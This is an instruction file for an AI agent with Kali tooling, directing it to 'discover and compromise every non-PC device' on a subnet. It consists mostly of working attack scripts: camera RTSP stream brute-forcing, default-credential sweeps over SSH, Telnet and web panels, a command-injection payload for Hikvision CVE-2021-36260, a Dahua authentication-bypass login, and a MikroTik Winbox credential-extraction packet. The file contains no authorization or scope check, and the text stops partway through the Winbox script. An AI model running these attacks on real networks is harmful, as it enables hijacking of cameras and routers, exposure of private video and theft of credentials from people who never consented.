---
description: IoT/Camera/Router/Printer exploitation — device discovery via MAC OUI+ONVIF+UPnP/SSDP, RTSP/ONVIF camera streams, brand-specific default credentials (Hikvision/Dahua/Axis/Amcrest/Reolink/Foscam/Bosch/Uniview/Cisco/MikroTik), CVE exploitation (CVE-2021-36260/CVE-2017-7921/CVE-2017-8225/CVE-2021-33044/CVE-2018-14847), MQTT broker, Modbus/BACnet ICS, PRET printer filesystem, firmware/config extraction
argument-hint: <subnet|host> (e.g. 192.168.1.0/24 or 192.168.1.100)
allowed-tools: [mcp__kali-pentest__execute_kali_command, mcp__kali-pentest__execute_parallel]
---

# pt-iot — IoT / Camera / Router / Printer Exploitation

You are an expert IoT and embedded device penetration tester. Discover and compromise every non-PC device on the network: IP cameras (Hikvision, Dahua, Axis, Hanwha), routers (Cisco, MikroTik, TP-Link, NETGEAR, Asus, D-Link), printers (HP, Canon, Epson), and other smart devices. Think like a human: "I see MAC OUI = Hikvision → port 8000 open → CVE-2021-36260 unauthenticated RCE → shell on camera → pivot to internal camera VLAN."

---

## Step 0 — Parse Arguments & Setup

`$ARGUMENTS` = `<subnet|host>`
- CIDR like `192.168.1.0/24` → scan full subnet
- Single IP like `192.168.1.100` → scan that host only

```bash
TARGET=<argument>
ENG=/home/kali/current
KALI_IP=$(ip route get 8.8.8.8 2>/dev/null | grep -oP 'src \K[^ ]+' | head -1)
mkdir -p $ENG/{loot/{iot,rtsp,snmp},scans/iot,poc/requests} 2>/dev/null

echo "=== pt-iot — IoT/Camera/Device Exploitation ==="
echo "Target: $TARGET"
echo "Kali IP: $KALI_IP"
echo ""

# Check for routersploit
which rsf.py 2>/dev/null || which routersploit 2>/dev/null || {
    echo "[!] routersploit not installed — installing..."
    pip3 install routersploit 2>/dev/null || \
    git clone https://www.github.com/threat9/routersploit /opt/routersploit 2>/dev/null && \
    pip3 install -r /opt/routersploit/requirements.txt 2>/dev/null
}
RSF=$(which rsf.py 2>/dev/null || echo "python3 /opt/routersploit/rsf.py")
```

---

## Phase 1 — Device Discovery + Vendor Identification

Discover all devices and classify them by vendor via MAC OUI lookup:

```bash
TARGET=<target>
ENG=/home/kali/current

echo "=== [Phase 1] Device Discovery + Vendor Identification ==="
echo ""

# ARP scan with MAC vendor lookup
echo "--- ARP scan with OUI vendor lookup ---"
arp-scan "$TARGET" --localnet 2>/dev/null | \
    grep -E "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | \
    tee $ENG/scans/iot/arp_devices.txt | \
    awk '{printf "  %-18s %-20s %s\n", $1, $2, $3}' | head -50

echo ""
echo "--- Classifying devices by vendor OUI ---"
python3 << 'EOF'
import subprocess

vendors = {
    'hikvision': ['00:0d:c0', 'bc:ad:28', '2c:69:ba', '44:19:b6', 'c4:02:8a', 'a4:14:37', '28:57:be', '5c:f4:ab'],
    'dahua': ['90:02:a9', 'e0:50:8b', '4c:11:bf', 'a4:02:b9', '00:12:34', '10:12:fb'],
    'axis': ['00:40:8c', 'ac:cc:8e', 'b8:a4:4f', '00:e0:4d'],
    'cisco': ['00:1a:a1', '00:0b:be', '00:1b:54', 'e8:4d:d0', '00:90:7f', '34:db:fd'],
    'mikrotik': ['e4:8d:8c', 'd4:ca:6d', '00:0c:42', 'b8:69:f4', '48:8f:5a', '18:fd:74', 'cc:2d:e0'],
    'ubiquiti': ['00:27:22', '04:18:d6', '24:a4:3c', 'dc:9f:db', 'f4:92:bf', '78:8a:20', '00:15:6d'],
    'netgear': ['00:09:5b', '00:0f:b5', '00:14:6c', '00:18:4d', '20:0c:c8', 'a0:21:b7', 'c4:04:15'],
    'tplink': ['00:1d:0f', '14:cc:20', '1c:7e:e5', '50:c7:bf', '98:de:d0', 'ac:84:c6', 'b0:48:7a'],
    'asus': ['00:0c:6e', '00:11:2f', '10:bf:48', '14:dd:a9', '2c:56:dc', '38:d5:47', '50:46:5d'],
    'dlink': ['00:0f:3d', '00:11:95', '00:13:46', '00:15:e9', '00:17:9a', '00:19:5b', '00:1c:f0'],
    'hanwha': ['00:09:18', '00:09:09', '20:a6:0c', 'b8:4a:ba'],
}

try:
    with open('/home/kali/current/scans/iot/arp_devices.txt', 'r') as f:
        lines = f.readlines()

    print("  Device Classification:")
    print(f"  {'IP':<18} {'MAC':<20} {'Vendor':<15} {'Type'}")
    print(f"  {'-'*18} {'-'*20} {'-'*15} {'-'*20}")

    for line in lines:
        parts = line.strip().split('\t')
        if len(parts) < 2:
            parts = line.strip().split()
        if len(parts) < 2:
            continue

        ip = parts[0] if parts else '?'
        mac = parts[1].lower() if len(parts) > 1 else '?'
        vendor_raw = ' '.join(parts[2:]) if len(parts) > 2 else 'Unknown'

        # OUI classification
        oui = mac[:8] if len(mac) >= 8 else ''
        device_type = 'Unknown'
        for vendor, ouis in vendors.items():
            if any(oui.startswith(o) for o in ouis):
                device_type = f"[{vendor.upper()}]"
                break

        # Keyword classification from vendor string
        vl = vendor_raw.lower()
        if 'hikvision' in vl or 'hangzhou' in vl: device_type = '[HIKVISION CAMERA]'
        elif 'dahua' in vl: device_type = '[DAHUA CAMERA]'
        elif 'axis' in vl: device_type = '[AXIS CAMERA]'
        elif 'hanwha' in vl or 'samsung' in vl: device_type = '[HANWHA/SAMSUNG CAMERA]'
        elif 'cisco' in vl: device_type = '[CISCO NETWORK]'
        elif 'mikrotik' in vl: device_type = '[MIKROTIK ROUTER]'
        elif 'ubiquiti' in vl: device_type = '[UBIQUITI]'
        elif 'netgear' in vl: device_type = '[NETGEAR ROUTER]'
        elif 'tp-link' in vl or 'tplink' in vl: device_type = '[TP-LINK ROUTER]'
        elif 'asus' in vl: device_type = '[ASUS ROUTER]'
        elif 'd-link' in vl or 'dlink' in vl: device_type = '[D-LINK ROUTER]'
        elif 'hewlett' in vl or 'hp ' in vl: device_type = '[HP PRINTER]'
        elif 'canon' in vl: device_type = '[CANON PRINTER]'
        elif 'epson' in vl: device_type = '[EPSON PRINTER]'
        elif 'apple' in vl: device_type = '[APPLE DEVICE]'
        elif 'intel' in vl or 'microsoft' in vl or 'vmware' in vl: device_type = '[PC/VM]'

        print(f"  {ip:<18} {mac:<20} {vendor_raw[:15]:<15} {device_type}")

except Exception as e:
    print(f"  Error: {e}")
EOF
```

---

## Phase 2 — Port-Based Device Classification

Identify device types from their port signatures:

```bash
TARGET=<target>
ENG=/home/kali/current

echo ""
echo "=== [Phase 2] Port-Based Device Classification ==="
echo ""

# Scan for IoT-specific ports
echo "Running targeted port scan for IoT signatures..."
nmap -sV -T4 --open -Pn \
    -p 21,22,23,25,53,80,161,443,554,3389,5900,8080,8443,8888,9090,\
8000,8001,8081,9527,37777,37778,49152,5000,5001,5002,6000,7070,\
9100,515,631,9000,4443,2000,8161,10000 \
    "$TARGET" \
    -oN $ENG/scans/iot/iot_ports.txt 2>/dev/null

echo ""
echo "--- Device classification by port signature ---"
python3 << 'EOF'
import re

try:
    with open('/home/kali/current/scans/iot/iot_ports.txt', 'r') as f:
        content = f.read()

    # Parse host blocks
    current_host = None
    host_ports = {}

    for line in content.split('\n'):
        host_match = re.search(r'Nmap scan report for (.+)', line)
        if host_match:
            current_host = host_match.group(1).split()[-1].strip('()')
            host_ports[current_host] = []
        elif current_host and '/tcp' in line and 'open' in line:
            port = line.split('/')[0].strip()
            service = line.split()[-1] if len(line.split()) > 2 else '?'
            host_ports[current_host].append((int(port), service))

    # Device signature rules
    SIGNATURES = {
        'IP Camera (Hikvision)': lambda p: 8000 in p or (80 in p and 554 in p and 8000 in p),
        'IP Camera (Dahua)': lambda p: 37777 in p or 9527 in p or (37778 in p),
        'IP Camera (RTSP)': lambda p: 554 in p or 8554 in p,
        'Router/Firewall': lambda p: 23 in p and (80 in p or 443 in p) and 22 in p,
        'Router (MikroTik)': lambda p: 8291 in p or (21 in p and 22 in p and 23 in p and 8080 in p),
        'Router (Ubiquiti)': lambda p: 8080 in p and 8443 in p and 22 in p,
        'Printer (JetDirect)': lambda p: 9100 in p,
        'Printer (IPP)': lambda p: 631 in p,
        'NVR/DVR': lambda p: 37777 in p and 554 in p,
        'Network Switch': lambda p: 23 in p and 161 in p and 80 in p,
        'Smart Device/IoT': lambda p: 5000 in p or 1883 in p or 8883 in p,
        'VoIP/PBX': lambda p: 5060 in p or 5061 in p,
    }

    for host, ports in host_ports.items():
        port_nums = [p[0] for p in ports]
        detected_types = [t for t, fn in SIGNATURES.items() if fn(port_nums)]
        if not detected_types:
            detected_types = ['Unknown device']

        print(f"\n  Host: {host}")
        print(f"  Open ports: {', '.join(map(str, sorted(port_nums)))}")
        print(f"  Device type: {' | '.join(detected_types)}")

        # Attack hints
        if 554 in port_nums or 37777 in port_nums or 8000 in port_nums:
            print(f"  [!] Camera detected → test RTSP stream + default creds + CVE-2021-36260")
        if 9100 in port_nums or 631 in port_nums:
            print(f"  [!] Printer detected → JetDirect raw print + config page at http://{host}/")
        if 23 in port_nums:
            print(f"  [!] Telnet open → default credentials very likely")
        if 161 in port_nums:
            print(f"  [!] SNMP open → full config dump likely available")
        if 8291 in port_nums:
            print(f"  [!] MikroTik Winbox → CVE-2018-14847 credential extraction")

except Exception as e:
    print(f"Error: {e}")
EOF
```

---

## Phase 3 — RTSP Stream Enumeration

Discover and access IP camera video streams:

```bash
ENG=/home/kali/current

echo ""
echo "=== [Phase 3] RTSP Stream Enumeration ==="
echo ""

# Extract hosts with RTSP/camera ports
CAMERA_HOSTS=$(grep -E "554/tcp.*open|37777/tcp.*open|8000/tcp.*open|8554/tcp.*open" \
    $ENG/scans/iot/iot_ports.txt 2>/dev/null | \
    grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u)

# Common RTSP URI paths for popular camera brands
RTSP_PATHS=(
    # Generic
    "/live"
    "/stream"
    "/video"
    "/channel1"
    "/stream1"
    "/h264Preview_01_main"
    "/cam/realmonitor?channel=1&subtype=0"
    # Hikvision
    "/Streaming/Channels/101"
    "/Streaming/Channels/1"
    "/h264/ch1/main/av_stream"
    # Dahua
    "/cam/realmonitor?channel=1&subtype=0&unicast=true&proto=Onvif"
    "/live?channel=1&subtype=0"
    # Axis
    "/axis-media/media.amp"
    "/axis-cgi/mjpg/video.cgi"
    # Hanwha
    "/profile5/media.smp"
    "/live.sdp"
    # Generic variants
    "/0"
    "/1"
    "/h265Preview_01_main"
)

RTSP_CREDS=(
    "admin:admin"
    "admin:12345"
    "admin:password"
    "admin:"
    "root:root"
    "root:admin"
    "admin:Admin1234"
    "admin:1234"
    "user:user"
    "guest:guest"
    "ubnt:ubnt"
)

for host in $CAMERA_HOSTS; do
    echo "--- Testing RTSP on $host ---"

    # Try nmap rtsp brute first
    nmap --script rtsp-url-brute -p 554 "$host" 2>/dev/null | \
        grep -E "RTSP|rtsp://|url|path" | head -10

    # Manual RTSP URI testing
    for cred in "${RTSP_CREDS[@]}"; do
        user=$(echo $cred | cut -d: -f1)
        pass=$(echo $cred | cut -d: -f2)
        for path in "${RTSP_PATHS[@]}"; do
            # Test with ffprobe (fast, non-streaming)
            result=$(timeout 5 ffprobe -v quiet -print_format json -show_streams \
                "rtsp://$user:$pass@$host:554$path" 2>&1 | head -3)
            if echo "$result" | grep -qE '"codec_type"|"width"'; then
                echo "  [RTSP STREAM FOUND] rtsp://$user:$pass@$host:554$path"
                echo "  Stream info: $(echo $result | head -c 100)"
                echo "  rtsp://$user:$pass@$host:554$path" >> $ENG/loot/rtsp/streams.txt
                break 2
            fi
        done
    done
    echo ""
done

echo "RTSP streams discovered → $ENG/loot/rtsp/streams.txt"
[ -s $ENG/loot/rtsp/streams.txt ] && cat $ENG/loot/rtsp/streams.txt || echo "(none found yet — try manual URIs)"
```

---

## Phase 3b — ONVIF Camera Discovery

ONVIF is the industry-standard camera protocol — enumerate device info, firmware, and stream profiles via SOAP:

```bash
ENG=/home/kali/current

echo ""
echo "=== [Phase 3b] ONVIF Camera Discovery ==="
echo ""

IOT_HOSTS=$(grep "Nmap scan report" $ENG/scans/iot/iot_ports.txt 2>/dev/null | \
    grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u)

for host in $IOT_HOSTS; do
    for port in 80 8080 8899 8000; do
        result=$(curl -sk --max-time 5 -X POST "http://$host:$port/onvif/device_service" \
            -H "Content-Type: application/soap+xml" \
            --data '<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">
<s:Header><wsa:Action xmlns:wsa="http://www.w3.org/2005/08/addressing">http://www.onvif.org/ver10/device/wsdl/GetDeviceInformation</wsa:Action></s:Header>
<s:Body><GetDeviceInformation xmlns="http://www.onvif.org/ver10/device/wsdl"/></s:Body></s:Envelope>' 2>/dev/null)

        echo "$result" | grep -qi "manufacturer\|model\|firmware" && {
            mfr=$(echo "$result" | grep -oP '(?<=<tt:Manufacturer>)[^<]+' | head -1)
            model=$(echo "$result" | grep -oP '(?<=<tt:Model>)[^<]+' | head -1)
            fw=$(echo "$result" | grep -oP '(?<=<tt:FirmwareVersion>)[^<]+' | head -1)
            serial=$(echo "$result" | grep -oP '(?<=<tt:SerialNumber>)[^<]+' | head -1)
            echo "  [ONVIF] $host:$port | $mfr $model | FW: $fw | Serial: $serial"
            echo "  [ONVIF] $host $mfr $model FW:$fw" >> $ENG/scans/iot/onvif_devices.txt

            # Get stream profiles (reveals RTSP URIs)
            profiles=$(curl -sk --max-time 5 -X POST "http://$host:$port/onvif/media_service" \
                -H "Content-Type: application/soap+xml" \
                --data '<?xml version="1.0"?><s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"><s:Body><GetProfiles xmlns="http://www.onvif.org/ver10/media/wsdl"/></s:Body></s:Envelope>' 2>/dev/null)
            profile_token=$(echo "$profiles" | grep -oP '(?<=token=")[^"]+' | head -1)
            echo "  Stream profile: $profile_token"

            # Get stream URI for the profile
            [ -n "$profile_token" ] && {
                stream_uri=$(curl -sk --max-time 5 -X POST "http://$host:$port/onvif/media_service" \
                    -H "Content-Type: application/soap+xml" \
                    --data "<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\"><s:Body><GetStreamUri xmlns=\"http://www.onvif.org/ver10/media/wsdl\"><StreamSetup><Stream>RTP-Unicast</Stream><Transport><Protocol>RTSP</Protocol></Transport></StreamSetup><ProfileToken>$profile_token</ProfileToken></GetStreamUri></s:Body></s:Envelope>" 2>/dev/null | \
                    grep -oP '(?<=<tt:Uri>)[^<]+' | head -1)
                [ -n "$stream_uri" ] && echo "  RTSP URI: $stream_uri" && \
                    echo "$stream_uri" >> $ENG/loot/rtsp/streams.txt
            }

            # Try unauthenticated snapshot
            snapshot=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" \
                "http://$host:$port/onvif/snapshot" 2>/dev/null)
            [ "$snapshot" = "200" ] && echo "  [!] Unauthenticated snapshot: http://$host:$port/onvif/snapshot"
        }
    done
done

[ -s $ENG/scans/iot/onvif_devices.txt ] && {
    echo ""
    echo "ONVIF cameras discovered:"
    cat $ENG/scans/iot/onvif_devices.txt
} || echo "No ONVIF responses (not all cameras implement it — check RTSP directly)"
```

---

## Phase 3c — UPnP/SSDP Device Discovery

SSDP multicast reveals all UPnP devices: routers, NAS, smart TVs, Chromecast, printers that respond to normal port scans inconsistently:

```bash
ENG=/home/kali/current
IFACE=$(ip route get 8.8.8.8 2>/dev/null | grep -oP 'dev \K\S+' | head -1)

echo ""
echo "=== [Phase 3c] UPnP/SSDP Device Discovery ==="
echo ""

mkdir -p $ENG/scans/iot

# SSDP M-SEARCH multicast — discovers ALL UPnP devices including those that don't respond to ARP
python3 << 'PYEOF'
import socket, time

msg = b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n'
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.settimeout(5)
s.sendto(msg, ('239.255.255.250', 1900))

discovered = {}
print("UPnP/SSDP devices (5s listen):")
end = time.time() + 5
while time.time() < end:
    try:
        data, addr = s.recvfrom(4096)
        ip = addr[0]
        if ip in discovered:
            continue
        discovered[ip] = True
        text = data.decode(errors='replace')
        location = next((l.split(':', 1)[1].strip() for l in text.split('\r\n') if l.upper().startswith('LOCATION:')), '')
        server = next((l.split(':', 1)[1].strip() for l in text.split('\r\n') if l.upper().startswith('SERVER:')), '')
        usn = next((l.split(':', 1)[1].strip() for l in text.split('\r\n') if l.upper().startswith('USN:')), '')
        print(f"  {ip:16} | {server[:40]:40} | {location[:50]}")
        with open('/home/kali/current/scans/iot/upnp_devices.txt', 'a') as f:
            f.write(f"{ip}|{server}|{location}|{usn}\n")
    except socket.timeout:
        break
    except Exception:
        pass
s.close()
print(f"Total UPnP devices: {len(discovered)}")
PYEOF

# Fetch rootDesc.xml from each device (contains model name, firmware, internal IPs)
echo ""
echo "--- Fetching UPnP device descriptions ---"
while IFS='|' read -r ip server location usn; do
    [ -z "$location" ] && continue
    result=$(curl -sk --max-time 5 "$location" 2>/dev/null)
    echo "$result" | grep -qi "device\|model\|manufacturer" && {
        model=$(echo "$result" | grep -oP '(?<=<modelName>)[^<]+' | head -1)
        mfr=$(echo "$result" | grep -oP '(?<=<manufacturer>)[^<]+' | head -1)
        fw=$(echo "$result" | grep -oP '(?<=<modelNumber>)[^<]+' | head -1)
        pres=$(echo "$result" | grep -oP '(?<=<presentationURL>)[^<]+' | head -1)
        internal_ip=$(echo "$result" | grep -oP '\b10\.\d+\.\d+\.\d+|\b172\.(1[6-9]|2[0-9]|3[0-1])\.\d+\.\d+|\b192\.168\.\d+\.\d+' | grep -v "^$ip$" | head -1)
        echo "  $ip | $mfr $model (FW: $fw) | Admin: $pres"
        [ -n "$internal_ip" ] && echo "  [!] Internal IP leaked in XML: $internal_ip"
    }
done < $ENG/scans/iot/upnp_devices.txt 2>/dev/null
```

---

## Phase 4 — Default Credential Sweep (Brand-Specific)

Test brand-specific default credentials on every discovered device:

```bash
ENG=/home/kali/current

echo ""
echo "=== [Phase 4] Default Credential Testing ==="
echo ""

# Function to test HTTP login with curl
test_web_creds() {
    local host=$1
    local port=$2
    local user=$3
    local pass=$4
    local proto="${5:-http}"

    CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
        -u "$user:$pass" "$proto://$host:$port/" 2>/dev/null)
    [ "$CODE" = "200" ] && echo "    [+] $proto://$host:$port/ → $user:$pass (HTTP Basic Auth)" && return 0

    # Try common form-based login paths
    for path in /login /admin /web /cgi-bin/main-cgi /ISAPI/Security/userCheck; do
        CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
            -u "$user:$pass" "$proto://$host:$port$path" 2>/dev/null)
        [ "$CODE" = "200" ] && echo "    [+] $proto://$host$path → $user:$pass" && return 0
    done
    return 1
}

# Get all live IoT hosts
IOT_HOSTS=$(grep "Nmap scan report" $ENG/scans/iot/iot_ports.txt 2>/dev/null | \
    grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u)

for host in $IOT_HOSTS; do
    echo "--- $host ---"
    PORT_FILE=$(grep -A30 "$host" $ENG/scans/iot/iot_ports.txt 2>/dev/null | head -30)

    # SSH brute force
    if echo "$PORT_FILE" | grep -q "22/tcp.*open"; then
        echo "  Testing SSH default creds..."
        for cred in "admin:admin" "admin:password" "admin:1234" "root:root" "root:admin" \
                    "admin:Admin1234" "ubnt:ubnt" "admin:12345" "pi:raspberry" "cisco:cisco"; do
            u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
            result=$(timeout 5 sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
                -o BatchMode=no "$u@$host" "id" 2>/dev/null)
            [ -n "$result" ] && echo "  [SSH +] $u:$p → $result" && \
                echo "$host SSH $u:$p" >> $ENG/loot/iot/found_creds.txt
        done
    fi

    # Telnet brute force (very common on cameras/routers)
    if echo "$PORT_FILE" | grep -q "23/tcp.*open"; then
        echo "  Testing Telnet default creds..."
        for cred in "admin:admin" "admin:password" "admin:" "root:root" "root:" \
                    "admin:12345" "user:user" "cisco:cisco" "ubnt:ubnt"; do
            u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
            result=$(timeout 8 hydra -l "$u" -p "$p" -t 1 -f telnet://$host 2>/dev/null | \
                grep "login:")
            [ -n "$result" ] && echo "  [TELNET +] $u:$p" && \
                echo "$host TELNET $u:$p" >> $ENG/loot/iot/found_creds.txt && break
        done
    fi

    # Web admin panel (most cameras/routers)
    for port in 80 8080 443 8443 8888; do
        echo "$PORT_FILE" | grep -q "${port}/tcp.*open" || continue
        proto="http"; [ "$port" = "443" ] || [ "$port" = "8443" ] && proto="https"

        code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 4 "$proto://$host:$port/" 2>/dev/null)
        [ "$code" = "000" ] && continue

        echo "  Web admin on $proto://$host:$port/ (HTTP $code)"

        # Hikvision defaults
        for cred in "admin:12345" "admin:admin" "admin:Admin12345" "admin:"; do
            u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
            test_web_creds "$host" "$port" "$u" "$p" "$proto" && \
                echo "    Hikvision $host $u:$p" >> $ENG/loot/iot/found_creds.txt && break
        done

        # Dahua defaults
        for cred in "admin:admin" "admin:" "admin:password" "888888:888888" "666666:666666"; do
            u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
            test_web_creds "$host" "$port" "$u" "$p" "$proto" && \
                echo "    Dahua $host $u:$p" >> $ENG/loot/iot/found_creds.txt && break
        done

        # Amcrest defaults
        for cred in "admin:admin" "admin:password" "admin:amcrest"; do
            u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
            test_web_creds "$host" "$port" "$u" "$p" "$proto" && \
                echo "    Amcrest $host $u:$p" >> $ENG/loot/iot/found_creds.txt && break
        done

        # Reolink defaults
        for cred in "admin:" "admin:12345678" "admin:reolink"; do
            u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
            test_web_creds "$host" "$port" "$u" "$p" "$proto" && \
                echo "    Reolink $host $u:$p" >> $ENG/loot/iot/found_creds.txt && break
        done

        # Foscam defaults
        for cred in "admin:" "admin:admin" "admin:foscam"; do
            u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
            test_web_creds "$host" "$port" "$u" "$p" "$proto" && \
                echo "    Foscam $host $u:$p" >> $ENG/loot/iot/found_creds.txt && break
        done

        # Tapo (TP-Link) defaults
        for cred in "admin:admin123" "admin:tplink" "admin:admin"; do
            u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
            test_web_creds "$host" "$port" "$u" "$p" "$proto" && \
                echo "    Tapo $host $u:$p" >> $ENG/loot/iot/found_creds.txt && break
        done

        # Bosch defaults
        for cred in "admin:admin" "service:service" "user:user"; do
            u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
            test_web_creds "$host" "$port" "$u" "$p" "$proto" && \
                echo "    Bosch $host $u:$p" >> $ENG/loot/iot/found_creds.txt && break
        done

        # Uniview defaults
        for cred in "admin:123456" "admin:admin" "admin:Uniview1"; do
            u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
            test_web_creds "$host" "$port" "$u" "$p" "$proto" && \
                echo "    Uniview $host $u:$p" >> $ENG/loot/iot/found_creds.txt && break
        done

        # Vivotek defaults
        for cred in "root:admin" "root:" "admin:admin"; do
            u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
            test_web_creds "$host" "$port" "$u" "$p" "$proto" && \
                echo "    Vivotek $host $u:$p" >> $ENG/loot/iot/found_creds.txt && break
        done

        # IndigoVision defaults
        for cred in "administrator:" "admin:" "admin:admin"; do
            u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
            test_web_creds "$host" "$port" "$u" "$p" "$proto" && \
                echo "    IndigoVision $host $u:$p" >> $ENG/loot/iot/found_creds.txt && break
        done

        # Router defaults
        for cred in "admin:admin" "admin:password" "admin:1234" "admin:" \
                    "admin:Admin1234" "root:root" "ubnt:ubnt" "cisco:cisco"; do
            u=$(echo $cred | cut -d: -f1); p=$(echo $cred | cut -d: -f2)
            test_web_creds "$host" "$port" "$u" "$p" "$proto" && \
                echo "    Router $host $u:$p" >> $ENG/loot/iot/found_creds.txt && break
        done
    done
    echo ""
done

echo "Found credentials → $ENG/loot/iot/found_creds.txt"
[ -s $ENG/loot/iot/found_creds.txt ] && cat $ENG/loot/iot/found_creds.txt
```

---

## Phase 5 — Known CVE Exploitation

Attempt brand-specific high-value CVEs:

```bash
ENG=/home/kali/current

echo ""
echo "=== [Phase 5] Known CVE Exploitation ==="
echo ""

IOT_HOSTS=$(grep "Nmap scan report" $ENG/scans/iot/iot_ports.txt 2>/dev/null | \
    grep -oP '\d+\.\d+\.\d+\.\d+' | sort -u)

for host in $IOT_HOSTS; do
    PORT_FILE=$(grep -A40 "$host" $ENG/scans/iot/iot_ports.txt 2>/dev/null | head -40)

    # --- CVE-2021-36260: Hikvision Unauthenticated RCE ---
    if echo "$PORT_FILE" | grep -qE "80/tcp.*open|8080/tcp.*open|8000/tcp.*open"; then
        for port in 80 8080 8000 443; do
            echo "$PORT_FILE" | grep -q "${port}/tcp.*open" || continue

            # Identify Hikvision by web fingerprint
            title=$(curl -sk --max-time 5 "http://$host:$port/" 2>/dev/null | \
                grep -oiP '(?<=<title>)[^<]+' | head -1)

            if echo "$title" | grep -qi "hik\|nvr\|dvr\|ipc\|ptz" || \
               curl -sk --max-time 5 "http://$host:$port/doc/page/login.asp" 2>/dev/null | \
               grep -qi "hikvision\|hik"; then

                echo "  [Hikvision detected] $host:$port — Testing CVE-2021-36260..."
                RESULT=$(curl -sk --max-time 10 \
                    -X PUT "http://$host:$port/SDK/webLanguage" \
                    -H "Content-Type: application/xml" \
                    --data '<?xml version="1.0" encoding="UTF-8"?><language>$(id > /tmp/CVE_2021_36260.txt)</language>' \
                    2>/dev/null)
                echo "  PUT response: $(echo $RESULT | head -c 200)"

                # Verify RCE
                sleep 2
                VERIFY=$(curl -sk --max-time 5 "http://$host:$port/SDK/webLanguage" 2>/dev/null)
                echo "  Verify: $(echo $VERIFY | head -c 100)"
                echo "$RESULT" | grep -qiv "error\|400\|401\|403\|404" && \
                    echo "  [!!!] CVE-2021-36260 may be exploitable on $host:$port" && \
                    echo "$host HTTP CVE-2021-36260 POTENTIAL" >> $ENG/loot/iot/cve_findings.txt
            fi
        done
    fi

    # --- CVE-2021-33044 / CVE-2021-33045: Dahua Authentication Bypass ---
    if echo "$PORT_FILE" | grep -qE "80/tcp.*open|8080/tcp.*open|37777/tcp.*open"; then
        for port in 80 8080; do
            title=$(curl -sk --max-time 5 "http://$host:$port/" 2>/dev/null | \
                grep -oiP '(?<=<title>)[^<]+' | head -1)

            if echo "$title" | grep -qi "dahua\|dss\|ivms\|nvr\|cam" || \
               curl -sk --max-time 5 "http://$host:$port/RPC2_Login" 2>/dev/null | grep -qi "dahua\|login"; then

                echo "  [Dahua detected] $host:$port — Testing CVE-2021-33044 auth bypass..."
                # Dahua magic hash: specific MD5 bypass
                MAGIC_HASH=$(python3 -c "
import hashlib
user = 'admin'
magic = hashlib.md5((user + ':6QNMIQGe').encode()).hexdigest().upper()
print(magic)
" 2>/dev/null)

                RESULT=$(curl -sk --max-time 8 "http://$host:$port/RPC2_Login" \
                    -X POST \
                    -H "Content-Type: application/json-rpc" \
                    --data "{\"method\":\"global.login\",\"params\":{\"userName\":\"admin\",\"password\":\"$MAGIC_HASH\",\"clientType\":\"Dahua3.0-Web3.0\"},\"id\":1,\"session\":0}" \
                    2>/dev/null)
                echo "  Auth bypass result: $(echo $RESULT | python3 -m json.tool 2>/dev/null | head -5)"
                echo "$RESULT" | python3 -c "import sys,json; d=json.load(sys.stdin); print('[AUTH BYPASSED]' if d.get('result') else 'failed')" 2>/dev/null && \
                    echo "$host HTTP Dahua-CVE-2021-33044-BYPASSED" >> $ENG/loot/iot/cve_findings.txt
            fi
        done
    fi

    # --- CVE-2018-14847: MikroTik Winbox Credential Extraction ---
    if echo "$PORT_FILE" | grep -q "8291/tcp.*open"; then
        echo "  [MikroTik Winbox] $host:8291 — Testing CVE-2018-14847..."
        python3 << PYEOF
import socket, sys

host = "$host"
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((host, 8291))

    # CVE-2018-14847: read /flash/rw/store/user.dat without authentication
    # Winbox protocol message to request credential file
    msg = bytes([
        0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
        0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    ])
    s.send(msg)
